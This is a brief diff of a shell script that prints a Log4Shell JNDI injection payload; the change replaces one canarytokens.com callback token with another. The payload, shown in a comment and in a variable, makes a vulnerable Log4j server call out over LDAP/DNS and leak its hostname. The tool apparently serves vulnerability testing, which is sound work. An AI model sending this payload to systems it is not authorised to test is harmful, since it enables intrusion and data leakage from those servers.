@@ -2,9 +2,9 @@
 #Author: Abhijeet Singh (@abhiunix)
 # Date: 12 Dec 2021
 # Twitter: https://twitter.com/abhiunix
-# Sample Payload: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}
+# Sample Payload: ${jndi:ldap://x${hostName}.L4J.unevwcogg20x52j86bv34turz.canarytokens.com/a}
 
-payload='${jndi:ldap://x${hostName}.L4J.j7k491dpt76iyma4x4e5rnyrv.canarytokens.com/a}'
+payload='${jndi:ldap://x${hostName}.L4J.unevwcogg20x52j86bv34turz.canarytokens.com/a}'
 echo ""
 echo -e "Your Payload: \033[31m$payload\033[m"
 
